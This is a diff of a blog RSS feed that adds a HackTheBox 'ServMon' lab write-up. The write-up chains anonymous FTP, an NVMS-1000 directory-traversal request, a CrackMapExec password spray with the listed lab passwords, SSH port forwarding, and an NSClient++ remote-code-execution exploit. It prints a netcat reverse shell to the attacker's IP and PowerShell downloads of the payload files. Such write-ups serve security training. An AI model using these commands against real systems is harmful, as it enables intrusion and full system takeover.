@@ -8,6 +8,280 @@
     <lastBuildDate>Tue, 06 Apr 2021 23:09:46 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/nvms-1000/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HackTheBox - ServMon</title>
+      <link>https://fahmifj.github.io/hackthebox/servmon/</link>
+      <pubDate>Tue, 06 Apr 2021 23:09:46 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/servmon/</guid>
+      <description>Exploiting embedded system software</description>
+      <content:encoded><![CDATA[<p>ServMon starts with FTP anonymous access that allows me to read the users' notes. One of these notes contains a hint to a location of a password list in one of the user&rsquo;s dekstops. This machine hosts a NVMS-1000 which is vulnerable to path traversal attack and is exploited to obtain the password list. With a password spray attack, I&rsquo;m able to gain a foothold on the system . Inside the machine, there is a config file of NSClient++, in which it contains a set of credentials. With these credentials, I can use public exploits for NSClient++ and gain interactive shell access as NT Authority\System.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Directory/Path Traversal</li>
+<li>NVMS-1000 exploitation</li>
+<li>NSClient-0.5.2.35 exploitation</li>
+<li>Port Forwarding/Tunneling</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></li>
+<li>Burp Suite</li>
+<li><a href="https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html">NSClient-0.5.2.35 Exploit PoC</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «servmon» «10.10.14.23»
+$ nmap -sC -sV -oA nmap/initial-servmon <span class="s1">&#39;10.10.10.184&#39;</span>
+...
+PORT     STATE SERVICE       VERSION
+21/tcp   open  ftp           Microsoft ftpd
+<span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+<span class="p">|</span>_01-18-20  12:05PM       &lt;DIR&gt;          Users
+<span class="p">|</span> ftp-syst: 
+<span class="p">|</span>_  SYST: Windows_NT
+22/tcp   open  ssh           OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+<span class="p">|</span> ssh-hostkey: 
+<span class="p">|</span>   <span class="m">2048</span> b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 <span class="o">(</span>RSA<span class="o">)</span>
+<span class="p">|</span>   <span class="m">256</span> 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 <span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_  <span class="m">256</span> 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp   open  http
+<span class="p">|</span> fingerprint-strings: 
+<span class="p">|</span>   GetRequest, HTTPOptions, RTSPRequest: 
+<span class="p">|</span>     HTTP/1.1 <span class="m">200</span> OK
+<span class="p">|</span>     Content-type: text/html
+<span class="p">|</span>     Content-Length: <span class="m">340</span>
+<span class="p">|</span>     Connection: close
+<span class="p">|</span>     AuthInfo: 
+<span class="p">|</span>     &lt;!DOCTYPE html PUBLIC <span class="s2">&#34;-//W3C//DTD XHTML 1.0 Transitional//EN&#34;</span> <span class="s2">&#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&#34;</span>&gt;
+<span class="p">|</span>     &lt;html <span class="nv">xmlns</span><span class="o">=</span><span class="s2">&#34;http://www.w3.org/1999/xhtml&#34;</span>&gt;
+<span class="p">|</span>     &lt;head&gt;
+<span class="p">|</span>     &lt;title&gt;&lt;/title&gt;
+<span class="p">|</span>     &lt;script <span class="nv">type</span><span class="o">=</span><span class="s2">&#34;text/javascript&#34;</span>&gt;
+<span class="p">|</span>     window.location.href <span class="o">=</span> <span class="s2">&#34;Pages/login.htm&#34;</span><span class="p">;</span>
+<span class="p">|</span>     &lt;/script&gt;
+<span class="p">|</span>     &lt;/head&gt;
+<span class="p">|</span>     &lt;body&gt;
+<span class="p">|</span>     &lt;/body&gt;
+<span class="p">|</span>     &lt;/html&gt;
+<span class="p">|</span>   NULL: 
+<span class="p">|</span>     HTTP/1.1 <span class="m">408</span> Request Timeout
+<span class="p">|</span>     Content-type: text/html
+<span class="p">|</span>     Content-Length: <span class="m">0</span>
+<span class="p">|</span>     Connection: close
+<span class="p">|</span>_    AuthInfo:
+<span class="p">|</span>_http-title: Site doesn<span class="err">&#39;</span>t have a title <span class="o">(</span>text/html<span class="o">)</span>.
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+5666/tcp open  tcpwrapped
+6699/tcp open  napster?
+8443/tcp open  ssl/https-alt
+<span class="p">|</span> fingerprint-strings: 
+<span class="p">|</span>   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+<span class="p">|</span>     HTTP/1.1 <span class="m">404</span>
+<span class="p">|</span>     Content-Length: <span class="m">18</span>
+<span class="p">|</span>     Document not found
+<span class="p">|</span>   GetRequest: 
+<span class="p">|</span>     HTTP/1.1 <span class="m">302</span>
+<span class="p">|</span>     Content-Length: <span class="m">0</span>
+<span class="p">|</span>     Location: /index.html
+<span class="p">|</span>_    refox/68.0
+<span class="p">|</span> http-title: NSClient++
+<span class="p">|</span>_Requested resource was /index.html
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
+<span class="p">|</span> Not valid before: 2020-01-14T13:24:20
+<span class="p">|</span>_Not valid after:  2021-01-13T13:24:20
+<span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+<span class="m">2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+<span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
+SF-Port80-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>4/12%Time<span class="o">=</span>5E93410A%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NULL
+SF:,6B,<span class="s2">&#34;HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
+</span><span class="s2">SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
+</span><span class="s2">SF:\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,1B4,<span class="s2">&#34;HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
+</span><span class="s2">SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
+</span><span class="s2">....
+</span><span class="s2">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span><span class="s2">
+</span><span class="s2">Host script results:
+</span><span class="s2">|_clock-skew: -28s
+</span><span class="s2">| smb2-security-mode: 
+</span><span class="s2">|   2.02: 
+</span><span class="s2">|_    Message signing enabled but not required
+</span><span class="s2">| smb2-time: 
+</span><span class="s2">|   date: 2020-04-12T16:27:15
+</span><span class="s2">|_  start_date: N/A
+</span></code></pre></div><p>RPC (135), NetBIOS (139), and SMB (445) are the known ports for Windows box. Besides these standard ports, there are some interesting services installed on the box:</p>
+<ul>
+<li>FTP with anonymous login on port 21,</li>
+<li>SSH service on port 22</li>
+<li>HTTPS service on non-standard port 8443.</li>
+</ul>
+<p>This machine probably is not an Active Directory.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-21---ftp">TCP 21 - FTP</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">...&lt;SNIP&gt;...
+21/tcp   open  ftp           Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_01-18-20  12:05PM       &lt;DIR&gt;          Users
+...&lt;SNIP&gt;...
+</code></pre></div><p>Based on <code>nmap</code> scans, the FTP root directory contains the <code>Users</code> folder. Inside the <code>Users</code> folder, I found two subfolders, one is <code>Nathan</code> and the other is <code>Nadine</code>. Both of these users' folders contain a text file, I copied these files to my machine.</p>
+<p>The first file is <code>Confidential.txt</code>. It contains a note from <code>Nadine</code> to <code>Nathan</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">Nathan,
+
+I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back into the secure folder.
+
+Regards
+
+Nadine
+</code></pre></div><p>The second file is <code>Notes to do.txt</code>. It contains a to do list.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">1) Change the password for NVMS - Complete
+2) Lock down the NSClient Access - Complete
+3) Upload the passwords
+4) Remove public access to NVMS
+5) Place the secret files in SharePoint
+</code></pre></div><p>I&rsquo;ll note that there&rsquo;s a <code>Password.txt</code> text on <code>Nathan</code>&rsquo;s desktop and the uncompleted to do.</p>
+<h3 id="tcp-445---smb">TCP 445 - SMB</h3>
+<p>Anonymous login is not allowed, so nothing to see here.</p>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>Visiting port 80 redirects me to a login page on <code>Pages/login.htm</code></p>
+<p><div class="img-container"><img src="imgs/image-20210406234719034.png" alt="image-20210406234719034"  /></div>
+</p>
+<p>Based on Google, NVSMS-1000 is a software for CCTV monitoring. I don&rsquo;t find the default credentials, and it doesn&rsquo;t seem to work with common credentials.</p>
+<h4 id="exploit-db">Exploit-DB</h4>
+<p>A quick search on <code>exploit-db</code> shows it is vulnerable to Directory Traversal.</p>
+<blockquote>
+<p>PoC: <a href="https://www.exploit-db.com/exploits/47774">https://www.exploit-db.com/exploits/47774</a></p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"># Title: NVMS-1000 - Directory Traversal
+# Date: 2019-12-12
+# Author: Numan Türle
+# Vendor Homepage: http://en.tvt.net.cn/
+# Version : N/A
+# Software Link : http://en.tvt.net.cn/products/188.html
+
+POC
+---------
+
+GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
+Host: 12.0.0.1
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
+Accept-Encoding: gzip, deflate
+Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7
+Connection: close
+
+Response
+---------
+
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+</code></pre></div><p>There&rsquo;s no version is specified, but I&rsquo;ll give it a try.</p>
+<h3 id="tcp-8443---nsclient">TCP 8443 - NSClient++</h3>
+<h4 id="exploit-db-1">Exploit-DB</h4>
+<p><div class="img-container"><img src="imgs/image-20210407052822638.png" alt="image-20210407052822638"  /></div>
+</p>
+<p>It took ages to load every page on this site. A quick search on Google shows that NSClient++ is another monitoring software. Adding &lsquo;exploit&rsquo; to the keyword pops up an exploit link that refers to exploit-DB:</p>
+<ul>
+<li>Manual PoC: <a href="https://www.exploit-db.com/exploits/46802">https://www.exploit-db.com/exploits/46802</a></li>
+<li>Scripted PoC: <a href="https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html">https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html</a></li>
+</ul>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-nadine">Shell as nadine</h3>
+<blockquote>
+<p>I&rsquo;ve added <code>htb.servmon</code>  to my <code>/etc/hosts</code>, so it will resolve to <code>10.10.10.184</code>. I know <code>htb.servmon</code> looks weird, but that&rsquo;s me in the past hehe..</p>
+</blockquote>
+<h4 id="nvms-1000-directory-traversal---obtain-passwordstxt">NVMS-1000 Directory Traversal - Obtain Passwords.txt</h4>
+<p>I started BurpSuite and performed directory traversal based on the PoC above against NVMS-1000</p>
+<p><div class="img-container"><img src="imgs/image-20210406234225362.png" alt="image-20210406234225362"  /></div>
+</p>
+<p>It returns a list of passwords</p>
+<p><div class="img-container"><img src="imgs/image-20210406234232390.png" alt="image-20210406234232390"  /></div>
+</p>
+<h4 id="password-spraying">Password spraying</h4>
+<p>I created a usernames list and a password list:</p>
+<ul>
+<li>
+<p><code>users.txt</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">nathan
+nadine
+</code></pre></div></li>
+<li>
+<p><code>passwords.txt</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">1nsp3ctTh3Way2Mars!
+Th3r34r3To0M4nyTrait0r5!
+B3WithM30r4ga1n5tMe
+L1k3B1gBut7s@W0rk
+0nly7h3y0unGWi11F0l10w
+IfH3s4b0Utg0t0H1sH0me
+Gr4etN3w5w17hMySk1Pa5$
+</code></pre></div></li>
+</ul>
+<p>With these, a password spray can be performed using <code>CrackMapExec</code>. It hits on <code>nadine:L1k3B1gBut7s@W0rk</code> pair.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «servmon» «10.10.14.23»
+$ crackmapexec smb htb.servmon -u users -p passwords
+...&lt;SNIP&gt;...
+SMB         10.10.10.184    <span class="m">445</span>    SERVMON          <span class="o">[</span>+<span class="o">]</span> SERVMON<span class="se">\n</span>adine:L1k3B1gBut7s@W0rk 
+...&lt;SNIP&gt;...
+</code></pre></div><h4 id="ssh-access">SSH access</h4>
+<p>The credentials also work on SSH.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «servmon» «10.10.14.23»
+$ ssh nadine@htb.servmon
+</code></pre></div><center>
+<p><div class="img-container"><img src="imgs/image-20210407055115129.png" alt="image-20210407055115129"  /></div>
+</p>
+</center>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-nt-authoritysystem">Shell as NT Authority\System</h3>
+<h4 id="obtain-nsclient-password">Obtain NSClient++ password</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">3) Upload the passwords
+4) Remove public access to NVMS
+5) Place the secret files in SharePoint
+</code></pre></div><p>Recall the to do list from previous enumeration, I discovered a password for NSClient++ in its default installation folder.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS C:<span class="se">\&gt;</span> gc <span class="s1">&#39;Program Files\NSClient++\nsclient.ini&#39;</span>
+</code></pre></div><center>
+<p><div class="img-container"><img src="imgs/image-20210407055600651.png" alt="image-20210407055600651"  /></div>
+</p>
+</center>
+<p>I&rsquo;ll try the <a href="https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html">scripted PoC</a>. But before that, I&rsquo;ll need to tunnel the connection first. This is because the config file is set to local only, so I can&rsquo;t perform exploit directly from outside.</p>
+<h4 id="ssh-tunneling">SSH Tunneling</h4>
+<p>SSH has tunneling features which allow me to access ServMon localhost and port from my localhost and specified port. For this, I&rsquo;ll create another SSH connection for tunneling.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «servmon» «10.10.14.23»
+$ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184 
+</code></pre></div><p><code>-L 8443:127.0.0.1:8443</code> means it will forward any connection on my localhost port 8443 to remote localhost  on port 8443. In this case, ServMon is the remote. Now I can perform exploitation.</p>
+<h4 id="nsclient-exploit-poc">NSClient++ Exploit PoC</h4>
+<p>First, I&rsquo;ll create a batch, called <code>sans.bat</code> file on my machine.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">@echo off
+
+C:\Temp\nc.exe 10.10.14.23 443 -e powershell.exe
+</code></pre></div><p>Once it created, I&rsquo;ll transfer the file to ServMon on <code>C:\temp\</code> via python http server along with <code>netcat</code> for windows.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «servmon» «10.10.14.23»
+$ Python -m SimpleHTTPServer <span class="m">80</span>
+</code></pre></div><p>Get the hosted files on ServMon</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">PS C:<span class="se">\&gt;</span> Invoke-webrequest -uri http://10.10.14.23/reverse -outfile C:/temp/reverse.bat
+PS C:<span class="se">\&gt;</span> Invoke-webrequest -uri http://10.10.14.23/nc.exe -outfile C:/temp/nc.exe
+</code></pre></div><p>Now I&rsquo;ll setup a listener on my Kali.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «servmon» «10.10.14.23»
+$ nc -nlvvp <span class="m">443</span>
+</code></pre></div><p>Then I can just run the exploit and wait on my listener.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «servmon» «10.10.14.23»
+$ python3 nsRCE.py -t 127.0.0.1 -P <span class="m">8443</span> -p <span class="s1">&#39;ew2x6SsGTxjRwXOT&#39;</span> -c <span class="s2">&#34;c:\temp\reverse.bat&#34;</span>
+</code></pre></div><p>Now I have an interactive shell as NT Authority\SYSTEM.</p>
+<p><div class="img-container"><img src="imgs/image-20210407063703741.png" alt="image-20210407063703741"  /></div>
+</p>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html">https://packetstormsecurity.com/files/157306/NSClient-0.5.2.35-Authenticated-Remote-Code-Execution.html</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - ServMon</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-servmon/</link>
       <pubDate>Tue, 06 Apr 2021 23:09:46 +0700</pubDate>
       
